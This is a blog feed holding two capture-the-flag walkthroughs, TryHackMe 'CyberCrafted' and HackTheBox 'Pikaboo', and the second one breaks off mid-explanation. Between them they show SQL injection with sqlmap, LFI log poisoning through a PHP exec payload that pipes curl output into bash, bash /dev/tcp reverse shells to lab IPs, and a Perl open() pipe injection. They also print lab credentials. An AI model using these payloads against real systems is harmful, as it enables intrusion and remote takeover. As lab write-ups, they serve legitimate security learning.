<?xml version="1.0" encoding="utf-8"?><feed xmlns="http://www.w3.org/2005/Atom" xml:lang="en"><generator uri="https://jekyllrb.com/" version="3.9.1">Jekyll</generator><link href="/feed.xml" rel="self" type="application/atom+xml" /><link href="/" rel="alternate" type="text/html" hreflang="en" /><updated>2022-01-09T19:34:34+01:00</updated><id>/feed.xml</id><title type="html">Ybenel</title><subtitle>Where Knowledge is peace of cake.</subtitle><author><name>Ybenel</name></author><entry><title type="html">THM - CyberCrafted</title><link href="/thm/2021/11/22/THM-CyberCrafted.html" rel="alternate" type="text/html" title="THM - CyberCrafted" /><published>2021-11-22T00:00:00+01:00</published><updated>2021-11-22T00:00:00+01:00</updated><id>/thm/2021/11/22/THM-CyberCrafted</id><content type="html" xml:base="/thm/2021/11/22/THM-CyberCrafted.html">&lt;p&gt;A Medium Linux Machine That Consist Of Exploiting A Minecraft Server.&lt;/p&gt;

&lt;h2 id=&quot;user-enumeration&quot;&gt;User Enumeration&lt;/h2&gt;

&lt;h3 id=&quot;open-ports&quot;&gt;Open Ports&lt;/h3&gt;

&lt;ul&gt;
  &lt;li&gt;22 ’ssh’ (Ubuntu) , 80 “Apache Httpd 2.4.49” , 25565 “Minecraft Server” ( Full Port Scan )&lt;/li&gt;
&lt;/ul&gt;

&lt;h3 id=&quot;initial-enum&quot;&gt;Initial Enum&lt;/h3&gt;

&lt;ul&gt;
  &lt;li&gt;10.10.212.240 &lt;em&gt;Redirect&lt;/em&gt; To #&lt;a href=&quot;http://cybercrafted.thm/&quot;&gt;http://cybercrafted.thm/&lt;/a&gt;#&lt;/li&gt;
  &lt;li&gt;In Root Page We See a hint &lt;strong&gt;&lt;em&gt;A Note to the developers: Just finished up adding other subdomains, now you can work on them!&lt;/em&gt;&lt;/strong&gt;
    &lt;ul&gt;
      &lt;li&gt;Let’s find those subdomains !&lt;/li&gt;
    &lt;/ul&gt;
  &lt;/li&gt;
&lt;/ul&gt;

&lt;p&gt;Found a bunch of subdomains using ffuf.&lt;/p&gt;
&lt;div class=&quot;language-sh highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;ffuf &lt;span class=&quot;nt&quot;&gt;-w&lt;/span&gt; /opt/wordlists/raft-medium-words.txt:SUBS &lt;span class=&quot;nt&quot;&gt;-H&lt;/span&gt; &lt;span class=&quot;s2&quot;&gt;&quot;Host: SUBS.cybercrafted.thm&quot;&lt;/span&gt; &lt;span class=&quot;nt&quot;&gt;-u&lt;/span&gt; http://10.10.212.240 &lt;span class=&quot;nt&quot;&gt;-fs&lt;/span&gt; 0
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;div class=&quot;language-plaintext highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;Subs Found:
admin                   [Status: 200, Size: 937, Words: 218, Lines: 31, Duration: 99ms]
store                   [Status: 403, Size: 287, Words: 20, Lines: 10, Duration: 100ms]
www                     [Status: 200, Size: 832, Words: 236, Lines: 35, Duration: 86ms]
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;ul&gt;
  &lt;li&gt;Login Page at &lt;a href=&quot;http://admin.cybercrafted.thm/login.php&quot;&gt;http://admin.cybercrafted.thm/login.php&lt;/a&gt;&lt;/li&gt;
&lt;/ul&gt;

&lt;p&gt;&lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;ffuf -w /opt/wordlists/raft-medium-words.txt:FILE -u http://admin.cybercrafted.thm/FILE.php -mc 200,302&lt;/code&gt;&lt;/p&gt;

&lt;div class=&quot;language-plaintext highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;panel                   [Status: 302, Size: 0, Words: 1, Lines: 1, Duration: 90ms]
login                   [Status: 302, Size: 0, Words: 1, Lines: 1, Duration: 3023ms]
index                   [Status: 200, Size: 937, Words: 218, Lines: 31, Duration: 5030ms]
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;ul&gt;
  &lt;li&gt;Found Search Engine At &lt;a href=&quot;http://store.cybercrafted.thm/search.php&quot;&gt;http://store.cybercrafted.thm/search.php&lt;/a&gt;&lt;/li&gt;
&lt;/ul&gt;

&lt;div class=&quot;language-sh highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;ffuf &lt;span class=&quot;nt&quot;&gt;-w&lt;/span&gt; /opt/wordlists/raft-medium-words.txt:FILE &lt;span class=&quot;nt&quot;&gt;-u&lt;/span&gt; http://store.cybercrafted.thm/FILE.php &lt;span class=&quot;nt&quot;&gt;-mc&lt;/span&gt; 200,302
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;div class=&quot;language-plaintext highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;search                  [Status: 200, Size: 838, Words: 162, Lines: 28, Duration: 106ms]
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;h3 id=&quot;interesting-discoveries&quot;&gt;Interesting Discoveries&lt;/h3&gt;

&lt;ul&gt;
  &lt;li&gt;Potential sql injection in &lt;a href=&quot;http://store.cybercrafted.thm/search.php&quot;&gt;http://store.cybercrafted.thm/search.php&lt;/a&gt;&lt;/li&gt;
&lt;/ul&gt;

&lt;h3 id=&quot;vulnerabilities-and-exploitation&quot;&gt;Vulnerabilities And Exploitation&lt;/h3&gt;

&lt;p&gt;Time-Based Blind Sql Injection In &lt;a href=&quot;http://store.cybercrafted.thm/search.php&quot;&gt;http://store.cybercrafted.thm/search.php&lt;/a&gt;
&lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;search=&amp;lt;Payload&amp;gt;&amp;amp;submit&lt;/code&gt;
Using Sqlmap to automate exploitation of our sql injecetion .&lt;/p&gt;

&lt;ul&gt;
  &lt;li&gt;
    &lt;p&gt;Tables (Database: Webapp)&lt;/p&gt;

    &lt;div class=&quot;language-sh highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;sqlmap &lt;span class=&quot;nt&quot;&gt;-u&lt;/span&gt; http://store.cybercrafted.thm/search.php &lt;span class=&quot;nt&quot;&gt;--data&lt;/span&gt; &lt;span class=&quot;s2&quot;&gt;&quot;search=*&amp;amp;submit=&quot;&lt;/span&gt; &lt;span class=&quot;nt&quot;&gt;--tables&lt;/span&gt;
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;    &lt;/div&gt;

    &lt;table&gt;
      &lt;tbody&gt;
        &lt;tr&gt;
          &lt;td&gt;admin&lt;/td&gt;
        &lt;/tr&gt;
        &lt;tr&gt;
          &lt;td&gt;stock&lt;/td&gt;
        &lt;/tr&gt;
      &lt;/tbody&gt;
    &lt;/table&gt;
  &lt;/li&gt;
  &lt;li&gt;
    &lt;p&gt;Columns (Table Admin)&lt;/p&gt;

    &lt;div class=&quot;language-sh highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;sqlmap &lt;span class=&quot;nt&quot;&gt;-u&lt;/span&gt; http://store.cybercrafted.thm/search.php &lt;span class=&quot;nt&quot;&gt;--data&lt;/span&gt; &lt;span class=&quot;s2&quot;&gt;&quot;search=*&amp;amp;submit=&quot;&lt;/span&gt; &lt;span class=&quot;nt&quot;&gt;--tamper&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;space2comment &lt;span class=&quot;nt&quot;&gt;-D&lt;/span&gt; webapp &lt;span class=&quot;nt&quot;&gt;-T&lt;/span&gt; admin &lt;span class=&quot;nt&quot;&gt;--columns&lt;/span&gt; &lt;span class=&quot;nt&quot;&gt;--threads&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;10
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;    &lt;/div&gt;

    &lt;table&gt;
      &lt;thead&gt;
        &lt;tr&gt;
          &lt;th style=&quot;text-align: left&quot;&gt;Columns&lt;/th&gt;
          &lt;th&gt;Type&lt;/th&gt;
        &lt;/tr&gt;
      &lt;/thead&gt;
      &lt;tbody&gt;
        &lt;tr&gt;
          &lt;td style=&quot;text-align: left&quot;&gt;user&lt;/td&gt;
          &lt;td&gt;varchar(32)&lt;/td&gt;
        &lt;/tr&gt;
        &lt;tr&gt;
          &lt;td style=&quot;text-align: left&quot;&gt;hash&lt;/td&gt;
          &lt;td&gt;varchar(64)&lt;/td&gt;
        &lt;/tr&gt;
        &lt;tr&gt;
          &lt;td style=&quot;text-align: left&quot;&gt;id&lt;/td&gt;
          &lt;td&gt;int(10) unsigned&lt;/td&gt;
        &lt;/tr&gt;
      &lt;/tbody&gt;
    &lt;/table&gt;
  &lt;/li&gt;
  &lt;li&gt;
    &lt;p&gt;Columns Dump&lt;/p&gt;

    &lt;div class=&quot;language-shell highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;   sqlmap &lt;span class=&quot;nt&quot;&gt;-u&lt;/span&gt; http://store.cybercrafted.thm/search.php &lt;span class=&quot;nt&quot;&gt;--data&lt;/span&gt; &lt;span class=&quot;s2&quot;&gt;&quot;search=*&amp;amp;submit=&quot;&lt;/span&gt; &lt;span class=&quot;nt&quot;&gt;--tamper&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;space2comment &lt;span class=&quot;nt&quot;&gt;-D&lt;/span&gt; webapp &lt;span class=&quot;nt&quot;&gt;-T&lt;/span&gt; admin &lt;span class=&quot;nt&quot;&gt;--dump&lt;/span&gt; &lt;span class=&quot;nt&quot;&gt;--threads&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;10 
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;    &lt;/div&gt;

    &lt;table&gt;
      &lt;thead&gt;
        &lt;tr&gt;
          &lt;th style=&quot;text-align: left&quot;&gt;id&lt;/th&gt;
          &lt;th&gt;hash&lt;/th&gt;
          &lt;th&gt;user&lt;/th&gt;
        &lt;/tr&gt;
      &lt;/thead&gt;
      &lt;tbody&gt;
        &lt;tr&gt;
          &lt;td style=&quot;text-align: left&quot;&gt;1&lt;/td&gt;
          &lt;td&gt;88b949dd5cdfbeAAAAAAAAbfa24e5974234e7c01&lt;/td&gt;
          &lt;td&gt;xXUltimateCreeperXx&lt;/td&gt;
        &lt;/tr&gt;
        &lt;tr&gt;
          &lt;td style=&quot;text-align: left&quot;&gt;4&lt;/td&gt;
          &lt;td&gt;THM{bbe3159060AAAAAAAd9b195001f75008}&lt;/td&gt;
          &lt;td&gt;web_flag&lt;/td&gt;
        &lt;/tr&gt;
      &lt;/tbody&gt;
    &lt;/table&gt;
  &lt;/li&gt;
  &lt;li&gt;
    &lt;p&gt;Web Flag&lt;/p&gt;
  &lt;/li&gt;
&lt;/ul&gt;

&lt;p&gt;&lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;THM{bbe3159060AAAAAAAAd9b195001f75008}&lt;/code&gt;&lt;/p&gt;

&lt;h3 id=&quot;usernames-and-passwords&quot;&gt;Usernames And Passwords&lt;/h3&gt;

&lt;ul&gt;
  &lt;li&gt;
    &lt;p&gt;Password Hash Cracked thanks to &lt;span style=&quot;color:blue&quot;&gt;&lt;em&gt;crackstation&lt;/em&gt;&lt;/span&gt;&lt;/p&gt;

    &lt;div class=&quot;language-json highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;nl&quot;&gt;&quot;xXUltimateCreeperXx&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;:&lt;/span&gt;&lt;span class=&quot;w&quot;&gt; &lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;&quot;diamondAAAAAAAA&quot;&lt;/span&gt;&lt;span class=&quot;w&quot;&gt;
&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;    &lt;/div&gt;
  &lt;/li&gt;
&lt;/ul&gt;

&lt;h3 id=&quot;command-execution&quot;&gt;Command Execution&lt;/h3&gt;

&lt;p&gt;After grabbing credentials we can login to &lt;a href=&quot;http://admin.cybercrafted.thm&quot;&gt;http://admin.cybercrafted.thm&lt;/a&gt;
In &lt;a href=&quot;http://admin.cybercrafted.thm/panel.php&quot;&gt;http://admin.cybercrafted.thm/panel.php&lt;/a&gt; we can execute commands&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;https://ybenel.cf/imgs/cybercrafted/rce.png&quot; alt=&quot;img&quot; /&gt;&lt;/p&gt;

&lt;p&gt;We can then spawn a reverse shell and pwn the system.&lt;/p&gt;

&lt;div class=&quot;language-plaintext highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;/bin/bash -i &amp;gt;&amp;amp; /dev/tcp/10.8.134.23/9110 0&amp;gt;&amp;amp;1
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;&lt;img src=&quot;https://ybenel.cf/imgs/cybercrafted/reverseshell.png&quot; alt=&quot;img&quot; /&gt;&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;https://ybenel.cf/imgs/cybercrafted/curl.png&quot; alt=&quot;img&quot; /&gt;&lt;/p&gt;

&lt;h2 id=&quot;privilege-escalation&quot;&gt;Privilege Escalation&lt;/h2&gt;

&lt;h3 id=&quot;interesting-discoveries-1&quot;&gt;Interesting Discoveries&lt;/h3&gt;

&lt;ul&gt;
  &lt;li&gt;Found 2 Users (xxultimatecreeperxx, cybercrafted)&lt;/li&gt;
  &lt;li&gt;&lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;xxultimatecreeperxx&lt;/code&gt; Has encrypted ssh key in &lt;span style=&quot;color:purple&quot;&gt;&lt;em&gt;/home/xxultimatecreeperxx/.ssh&lt;/em&gt;&lt;/span&gt;&lt;/li&gt;
&lt;/ul&gt;

&lt;p&gt;&lt;img src=&quot;https://ybenel.cf/imgs/cybercrafted/ssh_enc.png&quot; alt=&quot;img&quot; /&gt;&lt;/p&gt;

&lt;ul&gt;
  &lt;li&gt;Attempting to crack with john will give us the following password.&lt;/li&gt;
&lt;/ul&gt;

&lt;p&gt;&lt;img src=&quot;https://ybenel.cf/imgs/cybercrafted/ssh_crack.png&quot; alt=&quot;img&quot; /&gt;&lt;/p&gt;

&lt;ul&gt;
  &lt;li&gt;Login in as &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;xxultimatecreeperxx&lt;/code&gt;&lt;/li&gt;
&lt;/ul&gt;

&lt;p&gt;&lt;img src=&quot;https://ybenel.cf/imgs/cybercrafted/creeper.png&quot; alt=&quot;img&quot; /&gt;&lt;/p&gt;

&lt;ul&gt;
  &lt;li&gt;Minecraft Server Flag&lt;/li&gt;
&lt;/ul&gt;

&lt;p&gt;&lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;THM{ba93767ae3db9f5AAAAAAAA40a0c99e}&lt;/code&gt;&lt;/p&gt;

&lt;h3 id=&quot;possible-paths&quot;&gt;Possible Paths&lt;/h3&gt;

&lt;ul&gt;
  &lt;li&gt;Sketchy files at &lt;em&gt;opt/minecraft&lt;/em&gt;&lt;/li&gt;
&lt;/ul&gt;

&lt;h3 id=&quot;vulnerabities-exploitation&quot;&gt;Vulnerabities Exploitation&lt;/h3&gt;

&lt;ul&gt;
  &lt;li&gt;
    &lt;p&gt;Logging System Plugin Located in /opt/minecraft/cybercrafted/plugins/LoginSystem
Which Contains Username/Password (hashed)&lt;/p&gt;

    &lt;div class=&quot;language-plaintext highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;cybercrafted: dcbf543ee264e2d3a32c967d663e979e
madrinch: 42f749ade7f9e195bf475f37a44cafcb
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;    &lt;/div&gt;

    &lt;p&gt;Yet There’s a log file which contains plain text password of both users&lt;/p&gt;

    &lt;div class=&quot;language-plaintext highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;[2021/06/27 11:58:38] [BUKKIT-SERVER] Startet LoginSystem!
[2021/06/27 11:58:46] cybercrafted logged in. PW: JavaEdiAAAAAAAAAA
[2021/06/27 11:58:52] [BUKKIT-SERVER] Startet LoginSystem!
[2021/06/27 11:59:01] madrinch logged in. PW: Password123
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;    &lt;/div&gt;
  &lt;/li&gt;
  &lt;li&gt;
    &lt;p&gt;Ssh in as &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;cybercrafted&lt;/code&gt; we can read the user flag and we can also see that we can execute &lt;strong&gt;screen&lt;/strong&gt; as &lt;strong&gt;root&lt;/strong&gt;.&lt;/p&gt;

    &lt;p&gt;&lt;img src=&quot;https://ybenel.cf/imgs/cybercrafted/screen_user.png&quot; alt=&quot;img&quot; /&gt;&lt;/p&gt;
  &lt;/li&gt;
  &lt;li&gt;
    &lt;p&gt;We can Reattach to instance of &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;cybercrafted&lt;/code&gt; then we can create a new window with &lt;strong&gt;C-a c&lt;/strong&gt; And read the root flag.&lt;/p&gt;

    &lt;p&gt;&lt;img src=&quot;https://ybenel.cf/imgs/cybercrafted/root_ins.png&quot; alt=&quot;img&quot; /&gt;&lt;/p&gt;
  &lt;/li&gt;
&lt;/ul&gt;</content><author><name>[&quot;ybenel&quot;]</name></author><category term="THM" /><category term="THM" /><category term="MediumM" /><category term="Sql Injection" /><category term="Sqlmap" /><category term="Sql" /><category term="Minecraft" /><category term="screen" /><category term="subdomains" /><category term="fuff" /><summary type="html">A Medium Linux Machine That Consist Of Exploiting A Minecraft Server.</summary></entry><entry><title type="html">HTB - Pikaboo</title><link href="/htb/2021/09/17/Pikaboo.html" rel="alternate" type="text/html" title="HTB - Pikaboo" /><published>2021-09-17T00:00:00+01:00</published><updated>2021-09-17T00:00:00+01:00</updated><id>/htb/2021/09/17/Pikaboo</id><content type="html" xml:base="/htb/2021/09/17/Pikaboo.html">&lt;p&gt;A Hard Machine That Consist On Exploiting MisConfigurations&lt;/p&gt;

&lt;p&gt;&lt;a id=&quot;orga478a8e&quot;&gt;&lt;/a&gt;&lt;/p&gt;

&lt;h1 id=&quot;slim-to-none&quot;&gt;Slim To None&lt;/h1&gt;

&lt;p&gt;&lt;a id=&quot;orgbd954f4&quot;&gt;&lt;/a&gt;&lt;/p&gt;

&lt;h2 id=&quot;general-enumeration&quot;&gt;General Enumeration&lt;/h2&gt;

&lt;p&gt;&lt;a id=&quot;orga965546&quot;&gt;&lt;/a&gt;&lt;/p&gt;

&lt;h3 id=&quot;open-ports&quot;&gt;Open Ports&lt;/h3&gt;

&lt;p&gt;21 (vstpd 3.0.3) - 22 (SSH), 80 (Nginx), 8081 (py HTTP)&lt;/p&gt;

&lt;p&gt;&lt;a id=&quot;orgac5402c&quot;&gt;&lt;/a&gt;&lt;/p&gt;

&lt;h3 id=&quot;initial-enum&quot;&gt;Initial Enum&lt;/h3&gt;

&lt;ul&gt;
  &lt;li&gt;Web (80), Has Auth&lt;sub&gt;Basic&lt;/sub&gt; (redirect to 401)&lt;/li&gt;
  &lt;li&gt;
    &lt;p&gt;Confirmed Path Manipulation (Bypass 401) in /admin&lt;/p&gt;

    &lt;div class=&quot;language-plaintext highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;http://10.10.10.249/admin../server-status
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;    &lt;/div&gt;
  &lt;/li&gt;
&lt;/ul&gt;

&lt;p&gt;&lt;a id=&quot;orgde05944&quot;&gt;&lt;/a&gt;&lt;/p&gt;

&lt;h3 id=&quot;usernames-and-passwords&quot;&gt;Usernames And Passwords&lt;/h3&gt;

&lt;ul&gt;
  &lt;li&gt;No Credentials Found&lt;/li&gt;
&lt;/ul&gt;

&lt;p&gt;&lt;a id=&quot;orgd93d112&quot;&gt;&lt;/a&gt;&lt;/p&gt;

&lt;h3 id=&quot;interesting-discoveries&quot;&gt;Interesting Discoveries&lt;/h3&gt;

&lt;ul&gt;
  &lt;li&gt;admin page (&lt;a href=&quot;http://10.10.10.249/admin&quot;&gt;http://10.10.10.249/admin&lt;/a&gt;) [Requires Credentials]&lt;/li&gt;
  &lt;li&gt;weird path /admin/admin&lt;sub&gt;staging&lt;/sub&gt;&lt;/li&gt;
&lt;/ul&gt;

&lt;p&gt;&lt;a id=&quot;orgd7cc00c&quot;&gt;&lt;/a&gt;&lt;/p&gt;

&lt;h3 id=&quot;vulnerabilities-and-exploitation&quot;&gt;Vulnerabilities And Exploitation&lt;/h3&gt;

&lt;ul&gt;
  &lt;li&gt;Possible Exploitation Path&lt;/li&gt;
&lt;/ul&gt;

&lt;div class=&quot;proof&quot; id=&quot;orgc2a0a36&quot;&gt;
&lt;p&gt;
log poisoning lead to RCE through
LFI -&amp;gt; (Cache VSFTPD) -&amp;gt; RCE
&lt;/p&gt;

&lt;/div&gt;

&lt;ul&gt;
  &lt;li&gt;Exploitation Of (Log Poisoning)
    &lt;ol&gt;
      &lt;li&gt;We do have LFI &lt;a href=&quot;http://10.10.10.249/admin../admin_staging/index.php?page=&quot;&gt;admin&lt;sub&gt;staging&lt;/sub&gt;&lt;/a&gt;&lt;/li&gt;
      &lt;li&gt;We Have A Valid Log file (/var/log/vsftpd.log)&lt;/li&gt;
      &lt;li&gt;Payload
        &lt;ol&gt;
          &lt;li&gt;USER Field
            &lt;div class=&quot;language-php highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;    &lt;span class=&quot;cp&quot;&gt;&amp;lt;?php&lt;/span&gt; &lt;span class=&quot;nb&quot;&gt;exec&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;&quot;curl http://10.10.14.210:8000/rev | bash&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;            &lt;/div&gt;
          &lt;/li&gt;
          &lt;li&gt;Inside Of rev
            &lt;div class=&quot;language-bash highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;    &lt;span class=&quot;c&quot;&gt;#!/bin/bash&lt;/span&gt;
    /bin/bash &lt;span class=&quot;nt&quot;&gt;-c&lt;/span&gt; &lt;span class=&quot;s1&quot;&gt;'bash -i &amp;gt;&amp;amp; /dev/tcp/10.10.14.210/9110 0&amp;gt;&amp;amp;1'&lt;/span&gt;
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;            &lt;/div&gt;
          &lt;/li&gt;
          &lt;li&gt;Curl The Path
            &lt;div class=&quot;language-bash highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;    curl http://10.10.10.249/admin../admin_staging/index.php
    ?page&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;/var/log/vsftpd.log
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;            &lt;/div&gt;
          &lt;/li&gt;
        &lt;/ol&gt;
      &lt;/li&gt;
    &lt;/ol&gt;
  &lt;/li&gt;
  &lt;li&gt;Grab User.txt
&lt;img src=&quot;https://ybenel.cf/imgs/pikaboo/user_flag.png&quot; alt=&quot;img&quot; /&gt;&lt;/li&gt;
&lt;/ul&gt;

&lt;p&gt;&lt;a id=&quot;org0744151&quot;&gt;&lt;/a&gt;&lt;/p&gt;

&lt;h2 id=&quot;user-enumeration&quot;&gt;User Enumeration&lt;/h2&gt;

&lt;p&gt;&lt;a id=&quot;org4820c84&quot;&gt;&lt;/a&gt;&lt;/p&gt;

&lt;h3 id=&quot;interesting--discoveries&quot;&gt;Interesting  Discoveries&lt;/h3&gt;

&lt;ul&gt;
  &lt;li&gt;Cronjob (root) /usr/local/bin/csvupdate&lt;sub&gt;cron&lt;/sub&gt;&lt;/li&gt;
  &lt;li&gt;/etc/apache2/htpasswd (HTPass Auth Basic) (Salted MD5)&lt;/li&gt;
&lt;/ul&gt;

&lt;p&gt;&lt;a id=&quot;orge0cdc6b&quot;&gt;&lt;/a&gt;&lt;/p&gt;

&lt;h3 id=&quot;passwords&quot;&gt;Passwords&lt;/h3&gt;

&lt;ol&gt;
  &lt;li&gt;xxj31ZMTZzkVA (/etc/apache2/sites-available/default-ssl.conf)&lt;/li&gt;
  &lt;li&gt;Salted MD5 ($apr1$0.2FVvEK$Xn42uf/ySS5IPTKXfebXM.) [Not Cracked]&lt;/li&gt;
  &lt;li&gt;J~42%W?PFHl]g (Ldap /opt/pokeapi/config/settings.py)&lt;/li&gt;
&lt;/ol&gt;

&lt;p&gt;&lt;a id=&quot;org9d946cd&quot;&gt;&lt;/a&gt;&lt;/p&gt;

&lt;h3 id=&quot;user&quot;&gt;User&lt;/h3&gt;

&lt;ul&gt;
  &lt;li&gt;
    &lt;p&gt;Grabing User Password Through Ldap&lt;/p&gt;

    &lt;div class=&quot;language-plaintext highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;ldapsearch -x -h 127.0.0.1 -D 'cn=binduser,ou=users,dc=pikaboo,dc=htb' -w J~42%W?PFHl]g -b 'dc=ftp,dc=pikaboo,dc=htb'
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;    &lt;/div&gt;

    &lt;ul&gt;
      &lt;li&gt;
        &lt;p&gt;pwnmeow user&lt;/p&gt;

        &lt;div class=&quot;language-plaintext highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;# pwnmeow, users, ftp.pikaboo.htb
dn: uid=pwnmeow,ou=users,dc=ftp,dc=pikaboo,dc=htb
objectClass: inetOrgPerson
objectClass: posixAccount
objectClass: shadowAccount
uid: pwnmeow
cn: Pwn
sn: Meow
loginShell: /bin/bash
uidNumber: 10000
gidNumber: 10000
homeDirectory: /home/pwnmeow
userPassword:: X0cwdFQ0X0M0dGNIXyczbV80bEwhXw==
    
echo -n X0cwdFQ0X0M0dGNIXyczbV80bEwhXw== | base64 -d
_G0tT4_C4tcH_'3m_4lL!_
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;        &lt;/div&gt;
      &lt;/li&gt;
    &lt;/ul&gt;
  &lt;/li&gt;
&lt;/ul&gt;

&lt;p&gt;&lt;a id=&quot;org32b305e&quot;&gt;&lt;/a&gt;&lt;/p&gt;

&lt;h2 id=&quot;privilege-escalation&quot;&gt;Privilege Escalation&lt;/h2&gt;

&lt;p&gt;&lt;a id=&quot;org42aa660&quot;&gt;&lt;/a&gt;&lt;/p&gt;

&lt;h3 id=&quot;vulnerabities-exploitation&quot;&gt;Vulnerabities Exploitation&lt;/h3&gt;

&lt;p&gt;From The Previous Cronjobs We found we noticed there’s a script /usr/local/bin/csvupdate&lt;sub&gt;cron&lt;/sub&gt;.&lt;/p&gt;
&lt;div class=&quot;language-bash highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;    &lt;span class=&quot;c&quot;&gt;#!/bin/bash&lt;/span&gt;
    
    &lt;span class=&quot;k&quot;&gt;for &lt;/span&gt;d &lt;span class=&quot;k&quot;&gt;in&lt;/span&gt; /srv/ftp/&lt;span class=&quot;k&quot;&gt;*&lt;/span&gt;
    &lt;span class=&quot;k&quot;&gt;do
      &lt;/span&gt;&lt;span class=&quot;nb&quot;&gt;cd&lt;/span&gt; &lt;span class=&quot;nv&quot;&gt;$d&lt;/span&gt;
      /usr/local/bin/csvupdate &lt;span class=&quot;si&quot;&gt;$(&lt;/span&gt;&lt;span class=&quot;nb&quot;&gt;basename&lt;/span&gt; &lt;span class=&quot;nv&quot;&gt;$d&lt;/span&gt;&lt;span class=&quot;si&quot;&gt;)&lt;/span&gt; &lt;span class=&quot;k&quot;&gt;*&lt;/span&gt;csv
      /usr/bin/rm &lt;span class=&quot;nt&quot;&gt;-rf&lt;/span&gt; &lt;span class=&quot;k&quot;&gt;*&lt;/span&gt;
    &lt;span class=&quot;k&quot;&gt;done&lt;/span&gt;
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
&lt;p&gt;Essentially What the script does is that it lists all the folders exist in /srv/ftp and takes all csv files
and directs them as argument to another script called csvupdate.
Now as we read the perl script, we noticed it does use open() function to open files, However
after little bit of documentation reading we noticed that, if two filenames specified , if one had pipe symbol “|”
it will be interpreted as command thus being executed it.
Now Our Root Path has become more clear to what we should do.
I Found this stack overflow &lt;a href=&quot;https://stackoverflow.com/questions/26614348/perl-open-injection-prevention&quot;&gt;discussion&lt;/a&gt; which demonstrate , how we can achieve this. Unfortunately this was not that simple!
